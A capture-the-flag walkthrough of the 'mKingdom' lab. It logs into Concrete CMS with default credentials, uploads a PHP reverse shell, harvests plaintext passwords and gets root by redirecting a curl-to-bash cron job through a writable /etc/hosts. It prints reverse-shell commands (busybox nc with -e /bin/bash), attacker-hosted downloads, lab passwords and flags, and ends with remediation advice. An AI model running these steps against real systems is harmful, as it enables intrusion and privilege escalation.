# Target: mKingdom
**Platform:** [HackTheBox]
[mKingdom on TryHackMe](https://tryhackme.com/room/mkingdom)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| mKingdom | 10.114.190.172 | Linux | Easy |

---

The only information, that I've got before starting this room was to find: `user.txt` and `root.txt`.

## Phase 1: Reconnaissance & Enumeration

I started my reconnaissance by running the `Nmap` scan, with apriopriate flags: `-sV` to check version of services running on each port, `-vv` to increase verbosity while scanning.
**Nmap Scan:**
```bash
nmap -sV -vv 10.114.190.172
```

```
PORT   STATE SERVICE REASON         VERSION
85/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))
```

Thoc showed me that only port `85` was open. It isn't standard port for HTTP service, while it's port `80`. I immediately type the IP Address of the machine to the browser to check if it runs the HTTP page. When I typed: `https://10.114.190.172/`, I've recived the message: [Unable to connect]. So I changed the URL to: `https://10.114.190.172:85/`, and then I've recived an error: [Secure Connection Failed]. So I deleted the `s` from `https://` and I typed this RL: `http://10.114.190.172:85/`, and the browser showed me the black page with creature's head and text below it's: [Bwa, ha, ha, pahtetic, you'll never learn!]. I inspected the page source, but there was nothing hidde in the code.
Thanks to the fact that I found a working page I was able to execute `Directory Brute-force` attack and find some hidden directories.
**Directory Brute-forcing:**
```bash
gobuster dir -u http://10.114.190.172:85/ --wordlist /usr/share/dirb/wordlists/common.txt
```

```
.htpasswd            (Status: 403) [Size: 290]
.hta                 (Status: 403) [Size: 285]
.htaccess            (Status: 403) [Size: 290]
app                  (Status: 301) [Size: 316] [--> http://10.114.190.172:85/app/]
index.html           (Status: 200) [Size: 647]
server-status        (Status: 403) [Size: 294]
Progress: 4613 / 4613 (100.00%)
```

This showed me that there is only one avaiable hidden page: `/app`, so I enetered it. There I found the white page with green button in the center with the text: [JUMP]. I inspected the source of the page, and once again I didn't found any interesting things. There only was a function that pops up the window while clicking the button. I clicked the button, the popup box appeared with the text: [Make yourself confortable and enjoy my place.], I closed it and it redirected me to the another page: `http://10.114.190.172:85/app/castle/`. This was a page named: `Toad's Website`. It lokeed very simple, with some mushrooms photos and some text. I inspected the source of the page, but there I couldn't find something interesting.
I decided to use `gobuster` to find some hidden directories there.
**Directory Brute-forcing:**
```bash
gobuster dir -u http://10.114.190.172:85/app/castle --wordlist /usr/share/dirb/wordlists/common.txt
```

```
.hta                 (Status: 403) [Size: 296]
.htaccess            (Status: 403) [Size: 301]
.htpasswd            (Status: 403) [Size: 301]
application          (Status: 301) [Size: 335] [--> http://10.114.190.172:85/app/castle/application/]
concrete             (Status: 301) [Size: 332] [--> http://10.114.190.172:85/app/castle/concrete/]
index.php            (Status: 200) [Size: 12071]
packages             (Status: 301) [Size: 332] [--> http://10.114.190.172:85/app/castle/packages/]
robots.txt           (Status: 200) [Size: 532]
updates              (Status: 301) [Size: 331] [--> http://10.114.190.172:85/app/castle/updates/]
Progress: 4613 / 4613 (100.00%)
```

It found me some interesting directories, so I entered them all one by one. The directory `applicaton` was probably blocked, because it only shows white screen. The directory `concrete` contains a lot of server directories, but all of the files was blocked to me. The direcotry `packages` didn't conains any file or directory. The directory `updates` contains some directories, but all files was blocked to read. The file: `robots.txt` contains text:
```
User-agent: *
Disallow: /application/attributes
Disallow: /application/authentication
Disallow: /application/bootstrap
Disallow: /application/config
Disallow: /application/controllers
Disallow: /application/elements
Disallow: /application/helpers
Disallow: /application/jobs
Disallow: /application/languages
Disallow: /application/mail
Disallow: /application/models
Disallow: /application/page_types
Disallow: /application/single_pages
Disallow: /application/tools
Disallow: /application/views
Disallow: /ccm/system/captcha/picture
```

This text showed me exactly that I was blocked to see `application` directory, but when I looked for one of the sub directory I found them but as previous, all files was blocked to read. I keep enumerating the page and I found in the footer link to login page, I entered it and type default login credentials: [admin:password], and I've successfully logged to the admin panel.

## Phase 2: Initial Foothold (Gaining Access)

While I logged into the admin panel I moved to the website settings and changed the allowed files extension, I added `.php` files to the list and saved it. Then I coppied the `php-revese-shell.php` from the Kali and configured it by changing IP Address to my VPN address. I leave the port number on `3333`. Then I set the listener to listen for incoming connection.
**Listener Setup:**
```bash
nc -lvnp 3333
```

The I moved back to the admin page and uploaded the `php-revese-shell.php` file to the page and moved to the given URL: `http://10.114.190.172:85/app/castle/application/files/6317/8101/4211/php-reverse-shell.php`. This established the connection with my terminal.
**Proof of Access:**
```
connect to [192.168.158.248] from (UNKNOWN) [10.114.190.172] 54048
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:11:08 up  1:19,  0 users,  load average: 0.12, 0.06, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

Then I checked the users on this machine:
**Enumerating Users:**
```
cat /etc/passwd | grep bash
```

```
root:x:0:0:root:/root:/bin/bash
mario:x:1001:1001:,,,:/home/mario:/bin/bash
toad:x:1002:1002:,,,:/home/toad:/bin/bash
```

This showed me that there were three users. I found configuration file in this location: `/var/www/html/app/castle/application/config/database.php`, and read it using `cat` command:
```
<?php
S
return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

There I found username and password to the first user account. Then I checked avaiable programming languages on the system and avaiable shells.
**Checking Programming Languages and Shells:**
```bash
$ which python python3 perl ruby php
/usr/bin/python
/usr/bin/python3
/usr/bin/perl
/usr/bin/php
$ cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```

I saw that there was avaiable `python3` and `/bin/bash` so I created the command to spawn upgraded shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`. After executing this command I saw that prompt changed from `$` tp `www-data@mkingod:/$`, so I had knoww that this was a normal shell. The I changed user to `toad`: `su toad` and when I typed password, I logged as toad to the system.
**Proof of logging in:**
```bash
toad@mkingdom:/$ whoami
whoami
toad
```

Then I lookend for enviormental variables by running command: `env`.
```
APACHE_PID_FILE=/var/run/apache2/apache2.pid
XDG_SESSION_ID=c4
SHELL=/bin/bash
APACHE_RUN_USER=www-data
OLDPWD=/home
USER=toad
LS_COLORS=
PWD_token=aWthVGVOVEFOdEVTCg==
MAIL=/var/mail/toad
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
APACHE_LOG_DIR=/var/log/apache2
PWD=/home/toad
LANG=en_US.UTF-8
APACHE_RUN_GROUP=www-data
HOME=/home/toad
SHLVL=2
LOGNAME=toad
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1002
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env
```

There I found `PWD_token`. I coppied it and decrypted it on page `CyberChef` using `Base64` encryption and I've got a password: `ikaTeNTANtES`. The I logged as `mario` user.
**Proof of Mario:**
```bash
mario@mkingdom:/$ whoami
whoami
mario
```
I found `user.txt` file in this localisation: `/home/mario` but when I tried to read it, it showed me that I didn'd had permission to do this, so I coppied this file to `/tmp` directory and there I read it: `thm{030a769febb1b3291da1375234b84283}`.

## Phase 3: Privilege Escalation & Post-Exploitation
Next I wanted to escalate my privileges from `mario` user to the `root` user. I coppied the `pspy` tool to my current directory on my Kali Linux.
**Copying pspy to current directory:**
```bash
cp $(which pspy64) .
```

Next I started python http server there to download this tool to target machine.
**Starting python HTTP server:**
```bash
python3 -m http.server 8080
```

Then on target machine I, changed directory to `/tmp`, and then I  downloaded this file.
**Downloading pspy from HTTP server:**
```bash
wget http://192.168.158.248:8080/pspy64
```

When it was succesfully downloaded I made it executable: `chmod +x pspy` and I run this tool: `./pspy64`. After a while I've got a hidden cron job:
```
2026/06/10 16:46:01 CMD: UID=0     PID=2549   | curl mkingdom.thm:85/app/castle/application/counter.sh 
2026/06/10 16:46:01 CMD: UID=0     PID=2548   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2026/06/10 16:46:01 CMD: UID=0     PID=2547   | CRON 
```

There I found that this machine downloads tool `counter.sh` from `mkingdom/thm` page.
I checked the permission to the file `/etc/hosts`.
```bash
mario@mkingdom:~$ ls -la /etc/hosts
ls -la /etc/hosts
-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
```

This showed me that I could change the content of this file. But before that I had to recreate structure of the file on my Kali Linux machine.
**Creating file structure:**
```bash
mkdir -p app/castle/application/
```

Next I created revershe shell script named `counter.sh` in created localisation. I used page `online revese shell generator` to create it.
```
busybox nc 192.168.158.248 3333 -e /bin/bash
```

Then I started the server in current localisation on one terminal and set up the listener on another one.
**Started up server:**
```bash
python3 -m http.server 85
```

**Started listener:**
```bash
nc -lvnp 3333
```

After that I moved back to target machine and tried to change file: `/etc/host` but current shell wasn't able to do this. I backgrounded the connection: `ctrl + z`, then I changed the terminal type: `stty raw -echo; fg`, and moved back to the connection.
Next I moved to changing this file, but I've got error while I was opening the terminal, so I have to fix it: `export TERM='xterm'`, and then opene the file: `nano /etc/hosts`. There I changed IP Address of the mkingodm.thm to my VPN Address: `192.168.158.248`.

After a while of waiting I've got the connection.
**Proof of root connection:**
```
listening on [any] 3333 ...
connect to [192.168.158.248] from (UNKNOWN) [10.113.165.114] 45698
whoami
root
```

I upgraded shell as before, moved `root.txt` file to the `/tmp` directory and read the flag: `thm{e8b2f52d88b9930503cc16ef48775df0}`.
## Conclusion & Takeaways

**Summary:** 
The path to full system compromiste started with an Nmap scan that showed HTTP service runninng on non-standard port 85. While enumerating directories is showed hidden Concrete CMS login page, which was bypassed using default credeniatls (`admin:password`). Connection with server was achieved by modyfing the allowed file extension to accept `.php` files and uploading a reverse shell. Lateral movement to user `toad` was possible after finding database configuration file: `application/config/database.php` which was in the plain text. After reaching `toad` user, next step was inspecting enviormenta variables, which revealed a Base64 encoded token, wchich was decoded to show password to user `mario`. Finally, gaining `root` user was avaiable by running `pspy64` scritp which exposed a hidden root cron job downloading a script from `mkingodm.thm`. By exploiting war permission on the `/etc/hosts` file, the domain was redirected to the attacker's machine, allowing a malicious payload (`counter.sh`) to be downloaded and executed with root privileges.
**What I Learned:** 
- Locating Users: Parsing the `/etc/passwd` file for active shell binaries (like `/bin/bash`) is a quick and efective way to identify valid, interactive user accounts on a target system.
- Hunting for Credentials: Finding the `database.php` file reinforces the importance of manually enumerating web application directories for configuration files, which often contains hardcoded passowrds or secrets.
- Upgrading Shells: A basic revese shell is oftern to restriced. Learning to spawn an interactive TTY shell using `python3 -c 'import pty; pty.spawn("/bin/bash")'`, and stabilizing it using `stty raw -echo` and `export TERM='xterm` is absolutely crucial for using interactive terminal applications like, `su`, `nano`, or `vi`.
- Bypassing Reading Restrictions: Utilizing the `/tmp` directory is an exctellent workaround. If standard permissions or SUID restrictions allow you to view a file directory in home directory, copying it to `/tmp` can sometimes allow you to view its contents safely.
- Process Monitoring: Using tools like `pspy64` is incredibly valuable for discovering hidden automated taskt (cron jobs) executing in the backroung, expecially since it allows you to snoop on processes without needing root permissions.
- File Transfer: Setting up a local Python HTTP server and using `wget` is a fast and relible method for transferring enumeration scripts and exploit payloads onto a remote target.
**Remediation:** To secure this system and prevent simiilar attacks, a system administrator should implement the following patches:
1. Change Default Credentials: Administrative interface must never use defaulrt or easily guessable passwords (like `admin:password`). Strong password policies should be enforced.
2. Secure FIle Uploads: The web application should strictly validate file uploads and prevent administrators from arbitrary adding executable file extensions (like `.php`) from the web dashbord.
3. Manage Secrets Securely: Sensitive information, such as database passwords and user token, should not be stored in plaintext within configuration files or system-wide enviormental varaiables (`env`).
4. Fix File Permissions: The `/etc/hosts` file must be strcitly owned by `root` with write permissions disabled for standard users. Users like `mario` shoudl never be able to modify local DNS resolutions.
5. Secure Automated Tasks: Cron jobs running as `root` that fownload and execute scritps form external domains are extremely dangerous. If necessary, they should enforce encrypted connections (HTTPS), verify SSL certificates, and rely on secure, authenticated sources rather than local, easily spoofalbe DNS resolutions.
